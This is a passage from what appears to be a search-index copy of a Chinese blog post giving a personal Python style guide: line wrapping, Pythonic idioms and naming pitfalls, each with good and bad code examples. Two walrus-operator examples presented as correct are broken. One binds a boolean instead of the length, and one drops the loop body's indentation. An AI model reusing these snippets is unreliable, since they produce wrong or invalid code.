Python3 \u4e2d\u88ab\u79fb\u9664\uff0c\u6240\u4ee5\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u4f60\u4e5f\u7528\u4e0d\u7740\u5b83\uff08\u6216\u8005\u6ca1\u6cd5\u7528\u5b83\uff09\u3002</p> <p>\u8fd8\u6709\u4e00\u4e2a\u4f8b\u5b50\uff0c\u8fd9\u9002\u7528\u4e8e Bot \u89e3\u6790\u67d0\u4e9b\u89c6\u9891 URL \u65f6\u7528\u4e8e\u7f29\u77ed\u89c6\u9891\u63cf\u8ff0\uff08\u6216\u7b80\u4ecb\uff09\u7684\u6587\u5b57\u3002</p> <p>Example</p> <p>Good:</p> <pre><code>text = f'\u63cf\u8ff0\uff1a{textwrap.shorten(video.description, width=60, placeholder=\" ...\")}\\n'\n</code></pre> <p>Bad:</p> <pre><code>dotx3_description = '...' if len(video.description) &gt; 60 else ''\n...\ntext = f'\u63cf\u8ff0\uff1a{video.description[:60]}{dotx3_description}\\n'\n</code></pre> <p>\u7531\u4e8e Python \u81ea\u8eab\u7684\u6027\u8d28\uff0c\u4f7f\u7528 Python \u5b9e\u73b0\u4e00\u4e2a\u7279\u5b9a\u7684\u529f\u80fd\u975e\u5e38\u5bb9\u6613\uff0c\u4f46\u4e5f\u6b63\u56e0\u4e3a\u5982\u6b64\uff0c\u6709\u4e0d\u5c11\u521d\u5b66\u8005\u5728\u5b66\u4e60\u524d\u671f\u4f1a\u4f7f\u7528\u5927\u91cf\u7684\u81ea\u884c\u5b9e\u73b0\uff0c\u8fd9\u79cd\u81ea\u884c\u5b9e\u73b0\u53c8\u5e38\u5e38\u88ab\u79f0\u4e3a <code>\u91cd\u590d\u53d1\u660e\u8f6e\u5b50</code>\u3002</p> <p>\u91cd\u590d\u53d1\u660e\u8f6e\u5b50\u5e76\u4e0d\u4e00\u65e0\u662f\u5904\uff0c\u5bf9\u4e8e\u521d\u5b66\u8005\u800c\u8a00\uff0c\u8fd9\u5e38\u5e38\u662f\u4e00\u79cd\u63d0\u5347\u81ea\u8eab\u57fa\u672c\u80fd\u529b\u7684\u6709\u6548\u624b\u6bb5\u3002\u7136\u800c\u5bf9\u4e8e\u5e76\u975e\u521d\u5b66\u8005\u7684\u6211\u4eec\uff0c\u91cd\u590d\u53d1\u660e\u8f6e\u5b50\u5df2\u7ecf\u4e0d\u518d\u6709\u4efb\u4f55\u7528\u9014\u4e86\uff0c\u56e0\u6b64\u9700\u8981\u6781\u529b\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u9009\u62e9\u5177\u4f53\u7684\u5b9e\u73b0\u65b9\u6cd5\u65f6\uff0c\u8003\u8651\u4ee5\u4e0b\u4f18\u5148\u987a\u5e8f\uff1a</p> <ul> <li>\u8bed\u53e5\u3001<code>Builtins</code> \u51fd\u6570</li> <li>\u9b54\u6cd5\u65b9\u6cd5\u3001\u65b9\u6cd5</li> <li>Python \u6807\u51c6\u5e93</li> <li>\u7b2c\u4e09\u65b9\u5e93</li> <li>\u81ea\u884c\u5b9e\u73b0</li> </ul> <p>\u5728\u591a\u79cd\u5b9e\u73b0\u7684\u590d\u6742\u5ea6\u76f8\u5dee\u65e0\u51e0\u65f6\uff0c\u4e0a\u9762\u6392\u5e8f\u8d8a\u9760\u524d\u7684\u5b9e\u73b0\u65b9\u6cd5\u770b\u8d77\u6765\u8d8a\u4f18\u96c5\uff0c\u800c\u8d8a\u5f80\u540e\u7684\u5b9e\u73b0\u65b9\u6cd5\u770b\u8d77\u6765\u8d8a\u4e11\u964b\u3002\u53ea\u6709\u5728\u4f60\u53d1\u73b0\u9760\u524d\u7684\u65b9\u6cd5\u65e0\u6cd5\u6ee1\u8db3\u4f60\u7684\u9700\u6c42\uff08\u6216\u8fc7\u4e8e\u590d\u6742\uff09\u65f6\uff0c\u624d\u6709\u5fc5\u8981\u8003\u8651\u9760\u540e\u7684\u65b9\u6cd5\u3002</p>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#32","title":"3.2 \u4f7f\u7528\u62ec\u53f7\u6362\u884c\u53d6\u4ee3\u6362\u884c\u7b26\u6362\u884c","text":"<p>Python \u4e2d\u7684\u62ec\u53f7\u6709\u4e2a \u7279\u6027\uff0c\u5c31\u662f\u62ec\u53f7\u4e2d\u7684\u8868\u8fbe\u5f0f\u53ef\u4ee5\u5728\u4e00\u4e2a\u884c\u4e0a\u76f4\u63a5\u5206\u5272\uff0c\u800c\u65e0\u987b\u4f7f\u7528 <code>\\</code> \u6362\u884c\u3002</p> <p>\u4ee5 <code>import</code> \u8bed\u53e5\u4e3a\u4f8b\uff1a</p> <p>Example</p> <p>Good:</p> <pre><code>from .make_score_image import (\n    moe_draw_recent, guin_draw_recent, bandori_draw_recent,\n    andreal_v1_draw_recent, andreal_v2_draw_recent, andreal_v3_draw_recent, andreal_draw_b30,\n    song_list, draw_b30,\n)\n</code></pre> <p>Bad:</p> <pre><code>from .make_score_image import moe_draw_recent, guin_draw_recent, bandori_draw_recent, song_list, draw_b30, \\\n    andreal_v1_draw_recent, andreal_v2_draw_recent, andreal_v3_draw_recent, andreal_draw_b30\n</code></pre> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728\u62ec\u53f7\u5185\u8fdb\u884c\u6362\u884c\u540e\uff0c\u8bf7\u6ce8\u610f\u7f29\u8fdb\u3002\u8981\u4e48\u4f7f\u7528\u5782\u76f4\u7f29\u8fdb\uff0c\u8981\u4e48\u4f7f\u7528\u60ac\u6302\u7f29\u8fdb\u3002</p> <p>\u4ee5 <code>if</code> \u8bed\u53e5\u4e3a\u4f8b\uff1a</p> <p>Example</p> <p>Good:</p> <pre><code># 4\u7a7a\u683c\u60ac\u6302\u7f29\u8fdb\nif (\n    this_vid != last_vid\n    or this_vid == last_vid and (\n        this_lang in ['zh-Hans', 'zh']\n        or this_lang == 'ja' and last_lang not in ['zh-Hans', 'zh']\n        or this_lang == 'en' and last_lang not in ['zh-Hans', 'zh', 'ja']\n    )\n):\n    ...\n\n# \u4f7f\u7528\u5782\u76f4\u7f29\u8fdb\nif (this_vid != last_vid\n    or this_vid == last_vid and (this_lang in ['zh-Hans', 'zh']\n                                 or this_lang == 'ja' and last_lang not in ['zh-Hans', 'zh']\n                                 or this_lang == 'en' and last_lang not in ['zh-Hans', 'zh', 'ja'])):\n    ...\n</code></pre> <p>Bad:</p> <pre><code># \u65e0\u4efb\u4f55\u7f29\u8fdb\nif this_vid != last_vid or this_vid == last_vid and (this_lang in ['zh-Hans', 'zh'] or this_lang == 'ja' and last_lang not in ['zh-Hans', 'zh'] or this_lang == 'en' and last_lang not in ['zh-Hans', 'zh', 'ja']):\n    ...\n\n# \u4f7f\u7528\u4e11\u964b\u7684 \\ \u8fdb\u884c\u6362\u884c\nif this_vid != last_vid or this_vid == last_vid \\\n    and (this_lang in ['zh-Hans', 'zh'] or this_lang == 'ja' \\\n         and last_lang not in ['zh-Hans', 'zh'] or this_lang == 'en' \\\n         and last_lang not in ['zh-Hans', 'zh', 'ja']):\n    ...\n\n# 4\u7a7a\u683c\u60ac\u6302\u7f29\u8fdb\u5bf9\u9f50\u5230 if\nif this_vid != last_vid or this_vid == last_vid and (this_lang in ['zh-Hans', 'zh'] or this_lang == 'ja' and last_lang \n    not in ['zh-Hans', 'zh'] or this_lang == 'en' and last_lang not in \n    ['zh-Hans', 'zh', 'ja']):\n    ...\n</code></pre> <p>\u4ee5\u5b57\u7b26\u4e32\u7684\u591a\u884c\u62fc\u63a5\u4e3a\u4f8b\uff1a</p> <p>Example</p> <p>Good:</p> <pre><code>text = (\n    f'\u9879\u76ee\uff1a{repo.name}\\n'\n    f'\u4f5c\u8005\uff1a{owner}\\n'\n    f'\u5927\u5c0f\uff1a{repo.size} KB\\n'\n    f'\u8bed\u8a00\uff1a{repo.language or \"\u65e0\"}\\n'\n    f'\u8bb8\u53ef\u8bc1\uff1a{license_}\\n'\n    f'\ud83d\udc1e:{repo.open_issues_count} \u2b50:{repo.stargazers_count} \ud83c\udf74:{repo.forks_count}\\n'\n    f'\u521b\u5efa\u65f6\u95f4\uff1a{format_time(repo.created_at)}\\n'\n    f'\u4e0a\u6b21\u63d0\u4ea4\uff1a{format_time(repo.pushed_at)}\\n'\n    f'\u63cf\u8ff0\uff1a{repo.description or \"\u65e0\"}\\n'\n    f'\u6807\u7b7e\uff1a{tags}'\n)\n</code></pre> <p>Bad:</p> <pre><code>text = f'\u9879\u76ee\uff1a{repo.name}\\n' \\\n       f'\u4f5c\u8005\uff1a{owner}\\n' \\\n       f'\u5927\u5c0f\uff1a{repo.size} KB\\n' \\\n       f'\u8bed\u8a00\uff1a{repo.language or \"\u65e0\"}\\n' \\\n       f'\u8bb8\u53ef\u8bc1\uff1a{license_}\\n' \\\n       f'\ud83d\udc1e:{repo.open_issues_count} \u2b50:{repo.stargazers_count} \ud83c\udf74:{repo.forks_count}\\n' \\\n       f'\u521b\u5efa\u65f6\u95f4\uff1a{format_time(repo.created_at)}\\n' \\\n       f'\u4e0a\u6b21\u63d0\u4ea4\uff1a{format_time(repo.pushed_at)}\\n' \\\n       f'\u63cf\u8ff0\uff1a{repo.description or \"\u65e0\"}\\n' \\\n       f'\u6807\u7b7e\uff1a{tags}'\n</code></pre> <p>\u63d0\u793a\uff1a\u5bf9\u4e8e\u9700\u8981\u5f88\u591a\u6362\u884c\u7684\u5b57\u7b26\u4e32\uff0c\u4f7f\u7528 <code>\"\"\"</code> \u642d\u914d <code>textwrap.dedent()</code> \u662f\u6700\u4f18\u7684\u9009\u62e9\uff1a</p> <p>Example</p> <p>\u2b50Best:</p> <pre><code>import textwrap\n\ntext = textwrap.dedent(f\"\"\"\\\n    \u9879\u76ee\uff1a{repo.name}\n    \u4f5c\u8005\uff1a{owner}\n    \u5927\u5c0f\uff1a{repo.size} KB\n    \u8bed\u8a00\uff1a{repo.language or \"\u65e0\"}\n    \u8bb8\u53ef\u8bc1\uff1a{license_}\n    \ud83d\udc1e:{repo.open_issues_count} \u2b50:{repo.stargazers_count} \ud83c\udf74:{repo.forks_count}\n    \u521b\u5efa\u65f6\u95f4\uff1a{format_time(repo.created_at)}\n    \u4e0a\u6b21\u63d0\u4ea4\uff1a{format_time(repo.pushed_at)}\n    \u63cf\u8ff0\uff1a{repo.description or \"\u65e0\"}\n    \u6807\u7b7e\uff1a{tags}\n\"\"\")\n</code></pre> <p><code>textwrap</code> \u662f Python \u6807\u51c6\u5e93\u4e4b\u4e00\uff0c\u5176\u4e2d\u7684 <code>dedent()</code> \u51fd\u6570\u53ef\u4ee5\u79fb\u9664 <code>text</code> \u4e2d\u6bcf\u4e00\u884c\u7684\u4efb\u4f55\u76f8\u540c\u524d\u7f00\u7a7a\u767d\u7b26\u3002\u8fd9\u53ef\u4ee5\u7528\u6765\u6e05\u9664\u4e09\u91cd\u5f15\u53f7\u5b57\u7b26\u4e32\u884c\u5de6\u4fa7\u7a7a\u683c\uff0c\u5e76\u5728\u6e90\u7801\u4e2d\u4ecd\u7136\u663e\u793a\u4e3a\u7f29\u8fdb\u683c\u5f0f\u3002</p>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#33-python","title":"3.3 \u4f7f\u7528 Python \u4e60\u8bed\u53d6\u4ee3\u67d0\u4e9b\u81ea\u884c\u5b9e\u73b0","text":"<p>\u5f15\u7528</p> <p>\u5982\u679c\u8be2\u95ee\u4e00\u4e2a Python \u5f00\u53d1\u8005\u4ed6\u6700\u559c\u6b22 Python \u7684\u54ea\u4e00\u70b9\uff0c\u4ed6\u4eec\u901a\u5e38\u4f1a\u8bf4\u662f\u5176\u53ef\u8bfb\u6027\u3002\u786e\u5b9e\uff0c\u9ad8\u53ef\u8bfb\u6027\u662f Python \u8bed\u8a00\u8bbe\u8ba1\u7684\u6838\u5fc3\u51c6\u5219\u4e4b\u4e00\u3002\u4e00\u4e2a\u4e0d\u4e89\u7684\u4e8b\u5b9e\u662f\uff0c\u76f8\u5bf9\u4e8e\u5199\u4ee3\u7801\u800c\u8a00\uff0c\u8bfb\u4ee3\u7801\u624d\u662f\u66f4\u52a0\u5e73\u5e38\u7684\u4e8b\u60c5\u3002</p> <p>Python \u4ee3\u7801\u4e4b\u6240\u4ee5\u5bb9\u6613\u9605\u8bfb\u548c\u7406\u89e3\uff0c\u539f\u56e0\u4e4b\u4e00\u5c31\u662f\u5b83\u6709\u7740\u76f8\u5bf9\u5b8c\u6574\u7684\u7f16\u7801\u98ce\u683c\u6307\u5357\u4ee5\u53ca\u5404\u79cd\u5404\u6837 \u201cPythonic\u201d \u7684\u4e60\u8bed\u3002</p> <p>\u5f53\u4e00\u4e2a\u5bcc\u6709\u7ecf\u9a8c\u7684 Python \u5f00\u53d1\u8005\uff08\u4e5f\u79f0\u4e3a Pythonista\uff09\u6307\u51fa\u4e00\u90e8\u5206\u4ee3\u7801\u4e0d\u591f \u201cPythonic\u201d \u7684\u65f6\uff0c\u901a\u5e38\u610f\u5473\u7740\u8fd9\u90e8\u5206\u4ee3\u7801\u6ca1\u6709\u9075\u5faa\u901a\u7528\u7684\u98ce\u683c\u6307\u5357\uff0c\u540c\u65f6\u4e5f\u6ca1\u6709\u6309\u7167\u6700\u4f73\u65b9\u5f0f\uff08\u5373\uff1a\u6700\u5177\u6709\u53ef\u8bfb\u6027\uff09\u6765\u8868\u8fbe\u51fa\u4ee3\u7801\u7684\u610f\u56fe\u3002</p> <p>\u2014\u2014 realpython/python-guide</p> <ol> <li> <p>\u89e3\u5305</p> <p>Example</p> <p>Normal:</p> <pre><code>sentence = ('The', 'fox', 'jumped', 'over', 'the', 'fence')\nword_1 = sentence[0]\nword_2 = sentence[1]\nword_3 = sentence[2]\nword_4 = sentence[3]\nword_5 = sentence[4]\n</code></pre> <p>Pythonic:</p> <pre><code>sentence = ('The', 'fox', 'jumped', 'over', 'the', 'fence')\nword_1, word_2, word_3, word_4, word_5 = sentence\n</code></pre> </li> <li> <p>\u4ea4\u6362\u53d8\u91cf\uff08\u4ea4\u6362\u53d8\u91cf\u672c\u8d28\u4e0a\u4e5f\u662f\u4e00\u79cd\u89e3\u5305\uff09</p> <p>Example</p> <p>Normal:</p> <pre><code>c = a\na = b\nb = c\n</code></pre> <p>Pythonic:</p> <pre><code>a, b = b, a\n</code></pre> </li> <li> <p>\u5217\u8868\u63a8\u5bfc\u5f0f</p> <p>Example</p> <p>Normal:</p> <pre><code>squares = []\nfor i in range(10):\n    squares.append(i**2)\n</code></pre> <p>Pythonic:</p> <pre><code>squares = [i**2 for i in range(10)]\n</code></pre> <p>\u6ce8\u610f\uff0c\u82e5\u5199\u6210 <code>squares = (i**2 for i in range(10))</code>\uff0c\u90a3\u4e48\u8fd9\u662f\u4e00\u4e2a\u8fed\u4ee3\u5668\uff0c\u53ea\u6709\u5f53 <code>squares</code> \u88ab\u6d88\u8d39\u65f6\uff0c\u624d\u4f1a\u771f\u6b63\u6267\u884c\u91cc\u9762\u7684 <code>range()</code> \u51fd\u6570\u3002</p> </li> <li> <p>\u5e26\u7d22\u5f15\u7684\u5faa\u73af</p> <p>Example</p> <p>Normal:</p> <pre><code>bag = ['banana', 'apple', 'pear', 'orange', 'grape']\nfor i in range(len(bag)):\n    print(f'{i + 1}: {bag[i]}')\n</code></pre> <p>Pythonic:</p> <pre><code>bag = ['banana', 'apple', 'pear', 'orange', 'grape']\nfor index, item in enumerate(bag, start=1):\n    print(f'{index}: {item}')\n</code></pre> </li> <li> <p>\u7b80\u5316\u94fe\u5f0f\u5224\u65ad\u89c4\u5219</p> <p>Example</p> <p>Normal:</p> <pre><code>if a &gt;= 10 and a &lt;= 20:\n    ...\n</code></pre> <p>Pythonic:</p> <pre><code>if 10 &lt;= a &lt;= 20:\n    ...\n</code></pre> </li> <li> <p>\u7c7b\u578b\u5224\u65ad</p> <p>Example</p> <p>Normal:</p> <pre><code>x = Y()\ntype(x) == Y\n</code></pre> <p>Pythonic:</p> <pre><code>x = Y()\nisinstance(x, Y)\n</code></pre> </li> <li> <p>\u4f7f\u7528\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u8fdb\u884c\u6587\u4ef6\u8bfb\u5199</p> <p>Example</p> <p>Normal:</p> <pre><code>file = open(filename, 'r')\n...\nfile.close()\n</code></pre> <p>Pythonic:</p> <pre><code>with open(filename, 'r') as f:\n    ...\n</code></pre> <p>\u4f7f\u7528\u4f20\u7edf\u7684 <code>open()</code> \u51fd\u6570\u6253\u5f00\u6587\u4ef6\uff0c\u9700\u8981\u5728\u7ed3\u675f\u8bfb\u5199\u4e4b\u540e\u624b\u52a8\u4f7f\u7528 <code>close()</code> \u65b9\u6cd5\u5173\u95ed\u6587\u4ef6\u53e5\u67c4\u3002\u82e5\u8bfb\u5199\u7ed3\u675f\u4e4b\u540e\u6ca1\u6709\u5173\u95ed\u6587\u4ef6\u53e5\u67c4\uff0c\u5c06\u53ef\u80fd\u5bfc\u81f4\u6587\u4ef6\u53e5\u67c4\u88ab\u5360\u7528\uff0c\u4ece\u800c\u5bfc\u81f4\u7a0b\u5e8f\u5f02\u5e38\u9000\u51fa\uff08\u4f8b\u5982\u62a5 <code>WindowsError: [Error 32]</code>\uff09\u3002</p> <p>\u5373\u4f7f\u610f\u8bc6\u5230\u4e86\u8fd9\u4e00\u70b9\uff0c\u5728\u6bcf\u4e00\u6b21\u8bfb\u5199\u64cd\u4f5c\u7ed3\u675f\u540e\uff0c\u90fd\u6dfb\u52a0\u4e00\u53e5 <code>close()</code> \u6765\u5173\u95ed\u6587\u4ef6\u53e5\u67c4\uff0c\u8fd9\u6837\u4e5f\u662f\u4e0d\u53ef\u9760\u7684\u3002\u56e0\u4e3a\u53ef\u80fd\u5728\u6587\u4ef6\u5904\u7406\u8fc7\u7a0b\u4e2d\u53d1\u751f\u67d0\u4e9b\u5176\u4ed6\u7684\u9519\u8bef\uff0c\u5728\u9519\u8bef\u5904\u7406\u8fc7\u7a0b\u4e2d\u8df3\u8fc7\u4e86 <code>close()</code> \u65b9\u6cd5\uff0c\u8fd9\u6837\u4e5f\u4f1a\u5bfc\u81f4\u6587\u4ef6\u53e5\u67c4\u672a\u5173\u95ed\u3002</p> <p>\u4f7f\u7528 <code>with</code> \u8bed\u53e5\u7684\u597d\u5904\u5728\u4e8e\uff1a</p> <ul> <li>\u53ef\u4ee5\u81ea\u52a8\u5173\u95ed\u6587\u4ef6\u53e5\u67c4\uff0c\u4e0d\u9700\u8981\u5728\u7ed3\u675f\u8bfb\u5199\u4e4b\u540e\u624b\u52a8\u5173\u95ed\u6587\u4ef6\u53e5\u67c4\u3002</li> <li>\u5373\u4f7f\u5728\u6587\u4ef6\u5904\u7406\u8fc7\u7a0b\u4e2d\u53d1\u751f\u5176\u4ed6\u7684\u9519\u8bef\uff0c\u4e5f\u80fd\u4fdd\u8bc1\u6587\u4ef6\u53e5\u67c4\u88ab\u6b63\u786e\u5173\u95ed\u3002</li> </ul> </li> <li> <p>\u4f7f\u7528\u6d77\u8c61\u8fd0\u7b97\u7b26\uff08<code>:=</code>\uff09\u5728\u4efb\u4f55\u8868\u8fbe\u5f0f\u5185\u90e8\u4e3a\u53d8\u91cf\u8d4b\u503c</p> <p>Example</p> <p>Normal:</p> <pre><code>url = f'https://example.com/?name={name}'\nprint(url)\n</code></pre> <p>Pythonic:</p> <pre><code>print(url := f'https://example.com/?name={name}')\n</code></pre> <p>Example</p> <p>Normal:</p> <pre><code>n = len(a)\nif n &gt; 10:\n    print('\u592a\u957f\u4e86')\n</code></pre> <p>Pythonic:</p> <pre><code>if n := len(a) &gt; 10:\n    print('\u592a\u957f\u4e86')\n</code></pre> <p>Example</p> <p>Normal:</p> <pre><code>with open('test.png', 'r') as f:\n    while True:\n        block = f.read(256)\n        if not block:\n            break\n        process(block)\n</code></pre> <p>Pythonic:</p> <pre><code>with open('test.png', 'r') as f:\n    while block := f.read(256):\n    process(block)\n</code></pre> <p>Example</p> <p>\u82e5\u5728\u5217\u8868\u63a8\u5bfc\u5f0f\u4e2d\uff0c\u9700\u8981\u5728\u7b5b\u9009\u6761\u4ef6\u4e2d\u8ba1\u7b97\u4e00\u4e2a\u503c\uff0c\u800c\u540c\u4e00\u4e2a\u503c\u53c8\u5728\u8868\u8fbe\u5f0f\u4e2d\u9700\u8981\u88ab\u4f7f\u7528\uff1a</p> <pre><code>[y for x in data if (y := f(x)) &gt; 0]\n</code></pre> <p>\u6ce8\u610f\u6b64\u5904\u82e5\u4e0d\u4f7f\u7528\u6d77\u8c61\u8fd0\u7b97\u7b26\uff0c\u5219\u65e0\u6cd5\u4f7f\u7528\u5217\u8868\u63a8\u5bfc\u5f0f\u5b9e\u73b0\uff0c\u53ea\u80fd\u901a\u8fc7 <code>for</code> \u5faa\u73af\u5b9e\u73b0\u3002</p> <p>\u8bf7\u5c3d\u91cf\u5c06\u6d77\u8c61\u8fd0\u7b97\u7b26\u7684\u4f7f\u7528\u9650\u5236\u5728\u6e05\u6670\u7684\u573a\u5408\u4e2d\uff0c\u4ee5\u964d\u4f4e\u590d\u6742\u6027\u5e76\u63d0\u5347\u53ef\u8bfb\u6027\u3002</p> </li> </ol>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#_4","title":"\u56db\u3001\u8be5\u907f\u514d\u4ec0\u4e48","text":"","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#41","title":"4.1 \u907f\u514d\u8ff7\u60d1\u547d\u540d","text":"<p>\u5f15\u7528</p> <p>\u6539\u540d\u4e0d\u4ec5\u4ec5\u662f\u4fee\u6539\u540d\u5b57\u800c\u5df2\u3002\u5982\u679c\u4f60\u60f3\u4e0d\u51fa\u4e00\u4e2a\u597d\u540d\u5b57\uff0c\u8bf4\u660e\u80cc\u540e\u5f88\u53ef\u80fd\u6f5c\u85cf\u7740\u66f4\u6df1\u7684\u8bbe\u8ba1\u95ee\u9898\u3002\u4e3a\u4e00\u4e2a\u607c\u4eba\u7684\u540d\u5b57\u6240\u4ed8\u51fa\u7684\u7ea0\u7ed3\uff0c\u5e38\u5e38\u80fd\u63a8\u52a8\u6211\u4eec\u5bf9\u4ee3\u7801\u8fdb\u884c\u7cbe\u7b80\u3002</p> <p>\u2014\u2014 \u300a\u91cd\u6784\uff1a\u6539\u5584\u65e2\u6709\u4ee3\u7801\u7684\u8bbe\u8ba1\u300b</p> <p>\u547d\u540d\u662f\u7a0b\u5e8f\u5458\u6700\u96be\u89e3\u51b3\u7684\u4e00\u4e2a\u95ee\u9898\u4e4b\u4e00\uff0c\u800c\u8ff7\u60d1\u547d\u540d\u5c06\u5bfc\u81f4\u540e\u671f\u91cd\u6784\u65f6\u65e0\u6cd5\u6b63\u786e\u7406\u89e3\u5bf9\u8c61\u7684\u542b\u4e49\u3002</p> <p>\u867d\u7136\u6211\u4eec\u65e0\u6cd5\u505a\u5230 100% \u7684\u5b8c\u7f8e\u547d\u540d\uff0c\u4f7f\u6bcf\u4e2a\u5bf9\u8c61\u7684\u540d\u5b57\u90fd\u6070\u5230\u597d\u5904\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u907f\u514d\u51fa\u73b0\u8ff7\u60d1\u547d\u540d\u3002\u4e00\u4e2a\u4e0d\u4f73\u7684\u547d\u540d\u53ef\u80fd\u4ec5\u4ec5\u4f1a\u7ed9\u9605\u8bfb\u4ee3\u7801\u5e26\u6765\u56f0\u96be\uff0c\u800c\u8ff7\u60d1\u547d\u540d\u5219\u4f1a\u4f7f\u6211\u4eec\u5b8c\u5168\u6df7\u6dc6\u4ee3\u7801\u7684\u542b\u4e49\u3002\u4ee5\u4e0b\u5217\u4e3e\u4e86\u4e00\u4e9b\u8ff7\u60d1\u547d\u540d\u7684\u4f8b\u5b50\uff1a</p> <ol> <li> <p>\u6df7\u6dc6\u4f7f\u7528\u5143\u7d20\u5217\u8868\u547d\u540d</p> <p>Example</p> <pre><code>for user in user_list:\n    print(user)\n</code></pre> <pre><code>for user in users:\n    print(user)\n</code></pre> <p><code>user_list</code> \u548c <code>users</code> \u90fd\u53ef\u4ee5\u8868\u793a\u4e00\u4e2a\u5b58\u50a8\u7528\u6237\u4fe1\u606f\u7684\u5217\u8868\u3002\u5047\u5982\u4e00\u4e2a\u8fc7\u7a0b\u5185\u540c\u65f6\u5b9a\u4e49\u4e86 <code>user_list</code> \u548c <code>users</code>\uff0c\u4f60\u4f1a\u600e\u6837\u53bb\u533a\u5206\u5462\uff1f\u6700\u597d\u7684\u65b9\u6cd5\u662f\u53ea\u4f7f\u7528\u5176\u4e2d\u7684\u4e00\u79cd\u547d\u540d\u65b9\u5f0f\uff0c\u800c\u6211\u9009\u62e9\u7684\u662f\u524d\u8005\uff08\u540e\u8005\u5f53\u7136\u4e5f\u884c\uff0c\u4f46\u8bf7\u4e0d\u8981\u6df7\u6dc6\u4f7f\u7528\uff01\uff09</p> </li> <li> <p>\u6df7\u6dc6\u4f7f\u7528\u4e0b\u5212\u7ebf</p> <p>Example</p> <pre><code>song_list: list[Song] = []\nsonglist: dict[str, Any] = {}\n</code></pre> <p>\u4ee5\u4e0a\u5199\u6cd5\u975e\u5e38\u4ee4\u4eba\u8ff7\u60d1\uff0c<code>song_list</code> \u548c <code>songlist</code> \u53ef\u80fd\u90fd\u662f\u8868\u793a\u67d0\u4e2a\ud83c\uddec\ud83c\udde7\u6e38\u620f\u7684\u6b4c\u66f2\u5217\u8868\uff0c\u4f46\u662f\u8868\u793a\u8fd9\u4e2a \u201c\u5217\u8868\u201d \u7684\u6570\u636e\u7ed3\u6784\u5374\u662f\u4e0d\u540c\u7684\u3002\u5728\u540c\u4e00\u4e2a\u8fc7\u7a0b\u5185\u90e8\u540c\u65f6\u4f7f\u7528\u8fd9\u4e24\u4e2a\u53d8\u91cf\u5c06\u4f1a\u4f7f\u5176\u4ed6\u5f00\u53d1\u8005\uff08\u751a\u81f3\u81ea\u5df1\uff01\uff09\u5728\u8c03\u7528\u5b83\u4eec\u65f6\u7f54\u77e5\u6240\u63aa\u3002</p> <p>\u5f97\u4e8f\u8fd9\u662f\u6709 typing hint \u7684\u60c5\u51b5\uff0c\u8981\u662f\u9047\u5230\u4e00\u4e9b\u6ca1\u6709\u6807\u6ce8 typing hint \u8fd8\u8fd9\u6837\u5199\u7684\u4ee3\u7801\uff08\u4f8b\u5982\u6211\u7684\u65e9\u671f\u4ee3\u7801\uff09\uff0c\u90a3\u5c31\u771f\u7684\u8ba9\u4eba\u80cc\u5730\u91cc\u60f3\u9a82\u4eba\u4e86\u3002</p> </li> <li> <p>\u53d8\u91cf\u540d\u52a0\u5165\u7d2f\u8d58\u7684\u524d/\u540e\u7f00</p> <p>Example</p> <pre><code>user: dict[str, Any] = {}\nuser_data: dict[str, Any] = {}\nuser_info: dict[str, Any] = {}\nuser_detail: dict[str, Any] = {}\nuser_metadata: dict[str, Any] = {}\nuser_information: dict[str, Any] = {}\n</code></pre> <p>\u8fd9\u79cd\u547d\u540d\u4f55\u6b62\u662f\u8ff7\u60d1\uff0c\u7b80\u76f4\u662f\u4ee4\u4eba\u607c\u706b\uff01\u5047\u5982\u4e00\u4e2a\u8fc7\u7a0b\u5185\u540c\u65f6\u5b9a\u4e49\u4e86 <code>user</code>\u3001<code>user_data</code>\u3001<code>user_info</code>\u3001<code>user_detail</code>\u3001<code>user_metadata</code> \u548c <code>user_information</code>\uff0c\u5982\u679c\u6211\u8981\u83b7\u53d6\u7528\u6237\u7684\u4fe1\u606f\uff0c\u8bf7\u95ee\u6211\u8be5\u8c03\u7528\u90a3\u4e2a\u53d8\u91cf\u5462\uff1f</p> <p>\u5efa\u8bae\u5728\u65b0\u7684\u53d8\u91cf\u547d\u540d\u4e4b\u524d\uff0c\u4ed4\u7ec6\u68c0\u67e5\u5df2\u7ecf\u547d\u540d\u8fc7\u7684\u53d8\u91cf\uff0c\u5982\u679c\u51fa\u73b0\u8fd9\u79cd\u591a\u4e2a\u4e0d\u540c\u540e\u7f00\u8868\u793a\u540c\u4e00\u6570\u636e\u7684\u60c5\u51b5\uff0c\u5219\u53ef\u80fd\u8bf4\u660e\u8fd9\u5df2\u7ecf\u4e0d\u662f\u7b80\u5355\u7684\u547d\u540d\u95ee\u9898\u4e86\u3002</p> </li> <li> <p>\u4e0d\u6070\u5f53\u7684\u7f29\u5199</p> <p>Example</p> <p>Good:</p> <pre><code>def get_classifier_K_nearest_neighbors(dataset: Dataset, k: int) -&gt; Classifier:\n    ...\n</code></pre> <p>Bad:</p> <pre><code>def get_classifier_KNN(dataset: Dataset, k: int) -&gt; Classifier:\n    ...\n</code></pre> <p><code>KNN</code> \u6307\u7684\u662f <code>K-\u8fd1\u90bb\u7b97\u6cd5</code>\uff0c\u662f\u4e00\u79cd\u7528\u4e8e\u5206\u7c7b\u548c\u56de\u5f52\u7684\u975e\u53c2\u6570\u7edf\u8ba1\u65b9\u6cd5\uff0c\u501f\u7531\u8ba1\u7b97\u4e0e\u5df2\u77e5\u7c7b\u522b\u6848\u4f8b\u4e4b\u76f8\u4f3c\u5ea6\uff0c\u6765\u8bc4\u4f30\u672a\u77e5\u7c7b\u522b\u6848\u4f8b\u53ef\u80fd\u7684\u5206\u7c7b\u3002</p> 